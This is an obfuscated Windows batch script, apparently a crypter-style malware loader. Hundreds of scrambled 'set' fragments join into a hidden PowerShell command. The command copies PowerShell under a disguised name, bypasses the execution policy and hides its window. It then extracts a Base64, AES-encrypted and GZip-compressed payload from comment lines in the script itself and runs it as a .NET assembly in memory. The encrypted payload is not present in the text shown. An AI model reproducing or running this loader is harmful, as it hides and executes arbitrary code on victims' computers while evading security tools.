@echo off
set "gNooYclaYw=ring"
set "UuXbvPxVuV=[Sys"
set "rlHqHjfNet=.Mod"
set "sAaDsNQCjz='')("
set "qrMXSyxFem=DNJS"
set "DzZHmrfHjr=rans"
set "dgCreHrGuE=th('"
set "CiNGYjFbZq=eJ.D"
set "LgwhvEzRcM== $L"
set "wuNcsSNZSJ=em.C"
set "JxVRODjrVt=pose"
set "KejjPWdlGr=ion."
set "RBWjxYGNEp= = $"
set "GzwqFaBlMt=ose("
set "ZcZcBUhAlZ=ddin"
set "QKtmCTpKjB=Secu"
set "WxOSzLpmSb=.Len"
set "fCUtWMfXbD= = $"
set "TNvABBjbOp=('da"
set "MCkJCkPPmp=ct S"
set "qaCJUSKWWq=)($U"
set "PlJwVmGdYr=pStr"
set "NAXtNrHRUD=nAW."
set "kucnLMOkfl=le  "
set "QPcfQYOtNb=$LBW"
set "ddvlsGAonJ=stem"
set "viNWVzlFSr=QK.T"
set "hBNxKoRaqF=R5jf"
set "YTmAzfsxqu=Us, "
set "gSsZRaTZRY=oryS"
set "OEUTVHIRNj=m.IO"
set "GIZCBxOJqX=PKCS"
set "cSlJdsVnES=bjec"
set "tiYliOqRBE= = ["
set "PstBEeVBlU=urit"
set "SzwKOnyyJZ=gnir"
set "pDscLSEGbD=d;$L"
set "SSDDSJfkOV=wbAT"
set "mOGUtpIjGf=g = "
set "swuGpEWiuU=y]::"
set "ZSqNSklcMe=($cv"
set "wwVduNqxdF=lBlo"
set "FdVnHisymr=esMa"
set "LCWEwHIBHr=$Gwb"
set "PMGrlZeeeh=comp"
set "fzExHALvLV=lM ="
set "ijkSJebgvj=morF"
set "GxExjDTvfX=-joi"
set "gtfHgZrOST=BSce"
set "jwVVtzoFuj===')"
set "igSLiUgQRp=.Dis"
set "XsnPpzozCS=; };"
set "AlHxttPqye=$Gwb"
set "vAvMCjTcIP=BWqM"
set "JNrrSncumR=lUs."
set "ZBhowfDMIs=New-"
set "FwoJHOFecV=HO3I"
set "cljULJLtFE=SQK "
set "gAWVAQraOw=);$G"
set "gZEUzvHkwq=vert"
set "FiikdBIOxh=7;$L"
set "bYnnuQmdPd=('%*'"
set "RDxplFkBqM=3); "
set "vFrAFIVBwU=16] "
set "SStQzgYEaH=r.En"
set "EzmjmbtpVH=bA ="
set "LcylHRjzyH=BC;$"
set "ZuzIkUuyaC=CuSj"
set "hUgGZJZpXF=ewLi"
set "zENnElUYIv=Obje"
set "GfOdhTPfXe=Disp"
set "LYcsTMgGKe=hy.A"
set "jlTzgYmbkJ=.Cre"
set "zroPiIpwgY=tsWi"
set "tPxbcELhot=yste"
set "tfcPHgdJNv=();$"
set "UNGdBEAAwJ=qM.I"
set "ghYMYyXmuD=XYb."
set "AZkVqmMGQu=ay()"
set "vTAHDrlrYO=LBWq"
set "PUuHSOzfhm=tryP"
set "hyDWisrDmv=WelU"
set "EIsHJUmPvz=se()"
set "QpPCilLJRB=('ev"
set "NgCqcbqqOR=iron"
set "xVlcxSTNPH=1..-"
set "xqVBLvwpUT=Star"
set "UWCuMLtVgo=TllA"
set "iiRjwgMWQd=]::C"
set "HePyWjFDBg=]::("
set "xuejNaHkMG=UXvb"
set "antOBcBAEw=eam("
set "wUFivsQNzW=:: '"
set "ZgofALOmHk=ecry"
set "TyNbkkfufz=pher"
set "hZQxGmOQep=flec"
set "LtfNfCiKuK=mDeJ"
set "SCvgnFOYgT=rity"
set "fxIyzrtxeV=ionM"
set "ijMliSZVgB=8kuY"
set "ysZtORljyf=-1.."
set "IyAKyMpVVf=, $U"
set "IeiaRoefCL=AT.T"
set "DyJhoBeMQs=kMr "
set "rQOupxNZiM=.Cry"
set "EqwWmBjGAt=BWqM"
set "JuSXUmDrBx=J = "
set "dMPNyIFXYA=bstr"
set "RHZUpnytIV=ypto"
set "gXAhWhSCKL=.IO."
set "obTmtdWNYu=UXvb"
set "VxZBDZvWSq=:('g"
set "nFPOJrNmUA=.Ass"
set "uPkJKGhjWh= New"
set "xZqbafrVYh=$lFh"
set "tRFUyCHRBn=embl"
set "AfSmuAnXbw=ptor"
set "lOeQoehGAa=gth)"
set "cndDtXassx=zm83"
set "eIxabNkPlB=ptog"
set "trBGTCNnfj=2VUN"
set "aWThQlgZjB=6] -"
set "ExRjwHdAIi=ert]"
set "FulryxfxlC=null"
set "zLaccxSzoc=comm"
set "lxFrXgjNvt=ss -"
set "uRLNlSWmzW=ck($"
set "lLyOtrpOUd=bypa"
set "KaZhqXNRWC=ing("
set "wDHTRraHYh=Comp"
set "dJLuEdWcuB=tem."
set "sxkbyOJwNV=$Wel"
set "npfqXAyVfR=$dLS"
set "uEHyVzBkDl=M) {"
set "NqmcYukHJp=[-1."
set "FVgqHSBsel=JmDe"
set "QQinHZxZqw=y.Cr"
set "gYxOppPqIp=AT);"
set "VoVNQLFXuh= = N"
set "YyIRBJbQtQ=);$L"
set "YMIjLTasYD=Syst"
set "aOoNTpISzb=ress"
set "JaffacVCBN=F'[-"
set "LmfTmGXgmV=[Env"
set "PsOlwvXQOC=Conv"
set "RvTPHJMGfr='gni"
set "dFLqcZBzNA=in $"
set "JFjtEkFCdy=[]] "
set "kVTbWAvZcX=stem"
set "yvRZTbfCLp=pres"
set "dGWCNuwGiz=.Mem"
set "dKRpMkJHkN=SQK."
set "xGojEtKidL=ew-O"
set "kFUujmpzTk=tem."
set "jiSsKdQwAa=rt]:"
set "CoUrdcdmKy=.Sec"
set "IWFCRLHDFe=M.Pa"
set "kGCpzDoBJL=.Dis"
set "LGiBwLgPmP=Bmor"
set "NmLEBAqZOA=dV1k"
set "EZBfZaogpE=6esa"
set "uakZcnkdpm=New-"
set "iFRINhbmGb='[-1"
set "hcMMntlmGp=, (,"
set "waEDoKShda=.-16"
set "BzLOwFqoAd=yste"
set "mcyMsWCzJR=YrkM"
set "dFieHuvUUR=tem."
set "IjoqLgjTCq=pose"
set "nOyScnxYcg=BWqM"
set "xLYPQkzwIL=AT ="
set "zINAcGGtDH=fore"
set "XdQZTOTHpK=oint"
set "EmquSKjksh=b.Su"
set "vYMEDvofCO=Mode"
set "wROUUrqMak=ispo"
set "HxZrlyVnTu=and "
set "WzcFfnpugc=e]::"
set "wwsxTOcuWL=Invo"
set "OpsscugaLS= if "
set "IxdRtgQedR=m.IO"
set "CtLMYKCUaQ=t Sy"
set "fCGfCLewTt=oin "
set "QKxmghrDyN=1] -"
set "VXkRiZCdkz=mory"
set "ZJoQqygdCo=.Con"
set "yCWDWUyFDt=oL'["
set "tKLulXdlqk=.GZi"
set "yZgVHbFROE=oArr"
set "ruydZcaRDg=);$J"
set "zQzSwNynfz= [Sy"
set "LdsVSyhGDt=XYb "
set "BvSmrotqCD=V = "
set "GBTpnzGGmW=nage"
set "ahlwOkqYOk=onve"
set "QsuIGsctrW=JnAW"
set "nroqRmkUDF=ke($"
set "UHkgqZFarq=::De"
set "WPGAACESfV=ose("
set "afBfxdKkYe=ect "
set "DUgwKWWWLf=ach "
set "tojXZAatWo=BWqM"
set "aipvokaLyB=ptog"
set "xMCEzumtIi=Comp"
set "gztNPbKSBO=e = "
set "BEPxyhPRGg=THxh"
set "HwuYvgqXTj=[IO."
set "dvMlLRPAxS=.Com"
set "uFSZHFvfsW=-4] "
set "JkbJkYVhuW=$Gwb"
set "ztmGaSoMDY=XvbA"
set "jBgwzqOEwe=  $P"
set "XpyninUoUl=Stre"
set "FnKgvsgGuk=[Sys"
set "rVmLtVnBFB=esaB"
set "fJCzVjHhhJ=A, 0"
set "BpbDFagNjs='[-1"
set "GClBxYWDpT=form"
set "LezbVfjBGh=tion"
set "OhcduUNiJe=cvXY"
set "AfAOMPSjDq=)) {"
set "ANpZWRROwy=('%~f0'"
set "HJpiSyXrSf=;$dL"
set "gYvhBLNzVb=]::("
set "RDENUcihFp=Obje"
set "pecSGNnRnS=rtS4"
set "RtaFudIEzr=)($P"
set "CHqYNCRSJl=UXvb"
set "krLHYFsjHy=;$Yr"
set "tbwvPwiFhM= [Sy"
set "pGHuJHuPha=] -j"
set "kZtajIcNvX=A = "
set "OIZOoyirVf=bA);"
set "xdGmMoECUo=$UXv"
set "RdCLPYhotL=ment"
set "mwfruXFEYY=s = "
set "kOiiCvmGBB= [st"
set "pQkiuEmjeV=k; }"
set "OwvxmcsoFM=brea"
set "mWWDffMvsg=;$dL"
%JJQzIeJbsh%%XkdFvyVUhQ%%yXRGNMAfza%%mQKXIWFCSP%%ZllXMOoErT%%OPgJyMSkMW%%DECrVhzfXy%%SsbsQmMUUZ%%yWOFmxKbzW%%evQVlvITcE%%oiGSavNOSl%%ZYpMyGQWfx%%wyGauxCfgv%%ESSpLppVFQ%%JWinWgfdxE%%EMOEiPCFxC%%THIxHggabi%%rUqoNAqseo%%syIBQSdnhV%%NJydXcnKGP%%ZfconKvAQH%%zjBjjuZgGP%%dSSgvHwnrL%%mFMoonwtng%%wDwAvDhpTC%%cheRMhmVTG%%niieuUxnUW%%YFTAszvsKR%%zhtOJfBUBh%%aAAGTovsfB%%gUuWEwnDyn%%LUlbhfOtvo%%sCMMWxfmGe%"%~dp0%~nx0.exe"
cls
%abdOzniWuh%%RMuNwJrlYJ%
"%~nx0.exe" %AlahgnVfoF%%ueuCqUyQyx%%kucnLMOkfl%%DWmVnonaQg%%lLyOtrpOUd%%lxFrXgjNvt%%zLaccxSzoc%%HxZrlyVnTu%%xZqbafrVYh%%fzExHALvLV%%zQzSwNynfz%%kVTbWAvZcX%%gXAhWhSCKL%%MzBYVHzxEm%%HePyWjFDBg%%fMtOPCprVp%%UWCuMLtVgo%%aXuQqbhclN%%BpbDFagNjs%%shBpsKBuMl%%QKxmghrDyN%%ungiNFVZOL%%EFMNWSwexF%%ANpZWRROwy%%IDpwYfbsCM%%PBFaGkYKpn%%LmfTmGXgmV%%NgCqcbqqOR%%RdCLPYhotL%%ThziMvywjr%%hUgGZJZpXF%%TIVxwIKudn%%zINAcGGtDH%%DUgwKWWWLf%%ZSqNSklcMe%%LdsVSyhGDt%%dFLqcZBzNA%%LOIXnGrZIR%%uEHyVzBkDl%%OpsscugaLS%%JMplsXvvIm%%ghYMYyXmuD%%xqVBLvwpUT%%zroPiIpwgY%%dgCreHrGuE%%wUFivsQNzW%%AfAOMPSjDq%%jBgwzqOEwe%%eQVqwFMguP%%RBWjxYGNEp%%OhcduUNiJe%%EmquSKjksh%%dMPNyIFXYA%%KaZhqXNRWC%%RDxplFkBqM%%OwvxmcsoFM%%pQkiuEmjeV%%XsnPpzozCS%%xdGmMoECUo%%EzmjmbtpVH%%tbwvPwiFhM%%NSMMoljYvf%%ZJoQqygdCo%%gZEUzvHkwq%%gYvhBLNzVb%%RvTPHJMGfr%%pecSGNnRnS%%EZBfZaogpE%%LGiBwLgPmP%%JaffacVCBN%%xVlcxSTNPH%%vFrAFIVBwU%%GxExjDTvfX%%fLEBhPvgdD%%RtaFudIEzr%%gtfHgZrOST%%YyIRBJbQtQ%%nOyScnxYcg%%VoVNQLFXuh%%xGojEtKidL%%cSlJdsVnES%%CtLMYKCUaQ%%ddvlsGAonJ%%CoUrdcdmKy%%PstBEeVBlU%%QQinHZxZqw%%RHZUpnytIV%%GqkBaKJTHn%%LYcsTMgGKe%%FdVnHisymr%%GBTpnzGGmW%%pDscLSEGbD%%hRJDqDvXUR%%rlHqHjfNet%%gztNPbKSBO%%EMxIjOSpYK%%dJLuEdWcuB%%NQBHxHxVNp%%SCvgnFOYgT%%rQOupxNZiM%%eIxabNkPlB%%qWBJRBoFhY%%pYWBkXbhra%%TyNbkkfufz%%vYMEDvofCO%%iiRjwgMWQd%%LcylHRjzyH%%vTAHDrlrYO%%IWFCRLHDFe%%yjEbNsABXL%%mOGUtpIjGf%%UuXbvPxVuV%%kFUujmpzTk%%QKtmCTpKjB%%dxWAjdlCFY%%VEhbBGUmLg%%aipvokaLyB%%ANMSSMJukg%%bMTVpmDsLW%%ZcZcBUhAlZ%%czdeyhSojO%%WzcFfnpugc%%GIZCBxOJqX%%FiikdBIOxh%%tojXZAatWo%%ENujstABDa%%tiYliOqRBE%%EBWYIsycCb%%wuNcsSNZSJ%%ahlwOkqYOk%%jiSsKdQwAa%%VxZBDZvWSq%%brZRDxqAky%%cAnrSoCvsp%%bryRODiJSP%%OufyjRjaOm%%NqmcYukHJp%%waEDoKShda%%pGHuJHuPha%%fCGfCLewTt%%sAaDsNQCjz%%YbXNXhIRtq%%ZuzIkUuyaC%%FwoJHOFecV%%RSFIcdFShu%%cndDtXassx%%trBGTCNnfj%%BEPxyhPRGg%%pBrGAstLpK%%NmLEBAqZOA%%qrMXSyxFem%%ijMliSZVgB%%icXvvpSkVY%%QPcfQYOtNb%%UNGdBEAAwJ%%BvSmrotqCD%%FnKgvsgGuk%%dFieHuvUUR%%PsOlwvXQOC%%ExRjwHdAIi%%xTfmGVmNFW%%SzwKOnyyJZ%%vqSSFFOYIZ%%rVmLtVnBFB%%ijkSJebgvj%%iFRINhbmGb%%hnfFFXnLrS%%aWThQlgZjB%%DHDzRMdDXm%%UaVDtUeEmL%%QpPCilLJRB%%abdexzKFOT%%TJNeYZbpOV%%hBNxKoRaqF%%auMwmSWQgU%%kyPtRgCLEi%%jwVVtzoFuj%%HJpiSyXrSf%%cljULJLtFE%%LgwhvEzRcM%%EqwWmBjGAt%%jlTzgYmbkJ%%NVaPxBmhNo%%ZgofALOmHk%%AfSmuAnXbw%%ryHsZJqGzK%%obTmtdWNYu%%kZtajIcNvX%%npfqXAyVfR%%viNWVzlFSr%%DzZHmrfHjr%%GClBxYWDpT%%EbIgYbmweK%%wwVduNqxdF%%uRLNlSWmzW%%CHqYNCRSJl%%fJCzVjHhhJ%%IyAKyMpVVf%%fZWhhOgWqS%%WxOSzLpmSb%%lOeQoehGAa%%mWWDffMvsg%%dKRpMkJHkN%%xdcUUqUgTc%%GzwqFaBlMt%%YTTLYAXPdd%%vAvMCjTcIP%%kGCpzDoBJL%%JxVRODjrVt%%tfcPHgdJNv%%hyDWisrDmv%%mwfruXFEYY%%ZBhowfDMIs%%zENnElUYIv%%lFfAgXZKuJ%%BzLOwFqoAd%%OEUTVHIRNj%%dGWCNuwGiz%%gSsZRaTZRY%%UFxFHHKmEy%%phXlFUCibc%%iKgbWVmVbV%%OIZOoyirVf%%JkbJkYVhuW%%xLYPQkzwIL%%uPkJKGhjWh%%LlnVsYIxRY%%afBfxdKkYe%%YMIjLTasYD%%QMkmkmycwR%%CcFJLooelH%%VXkRiZCdkz%%XpyninUoUl%%FHNgCWhZyw%%FVgqHSBsel%%JuSXUmDrBx%%uakZcnkdpm%%RDENUcihFp%%MCkJCkPPmp%%tPxbcELhot%%IxdRtgQedR%%dvMlLRPAxS%%yvRZTbfCLp%%qbTlHozsqv%%tKLulXdlqk%%PlJwVmGdYr%%antOBcBAEw%%sxkbyOJwNV%%YTmAzfsxqu%%HwuYvgqXTj%%wDHTRraHYh%%DjpdtgaSov%%KejjPWdlGr%%xMCEzumtIi%%eKyjRygqFo%%fxIyzrtxeV%%oPbGJQGKDY%%UHkgqZFarq%%PMGrlZeeeh%%aOoNTpISzb%%RvMGuxnBhA%%LtfNfCiKuK%%MCGwYftwmb%%qNBqztZaWN%%LCWEwHIBHr%%gYxOppPqIp%%eRpgjXSPnL%%CiNGYjFbZq%%wROUUrqMak%%EIsHJUmPvz%%PTnVPYlQQf%%JNrrSncumR%%GfOdhTPfXe%%WPGAACESfV%%gAWVAQraOw%%SSDDSJfkOV%%igSLiUgQRp%%IjoqLgjTCq%%CPqBmemcHQ%%xuejNaHkMG%%JAjzNIDmSM%%AlHxttPqye%%IeiaRoefCL%%yZgVHbFROE%%AZkVqmMGQu%%krLHYFsjHy%%DyJhoBeMQs%%NYCUDITnJF%%CxoiAhnzWb%%JwkpacpcHP%%hZQxGmOQep%%LezbVfjBGh%%nFPOJrNmUA%%tRFUyCHRBn%%swuGpEWiuU%%TNvABBjbOp%%yCWDWUyFDt%%ysZtORljyf%%uFSZHFvfsW%%tFdmPPzRKv%%frEbwBOcLK%%qaCJUSKWWq%%ztmGaSoMDY%%ruydZcaRDg%%QsuIGsctrW%%fCUtWMfXbD%%mcyMsWCzJR%%SStQzgYEaH%%PUuHSOzfhm%%XdQZTOTHpK%%QDKAenjeTP%%NAXtNrHRUD%%wwsxTOcuWL%%nroqRmkUDF%%FulryxfxlC%%hcMMntlmGp%%kOiiCvmGBB%%gNooYclaYw%%JFjtEkFCdy%%bYnnuQmdPd%%kyVKvtOxOl%
exit /b
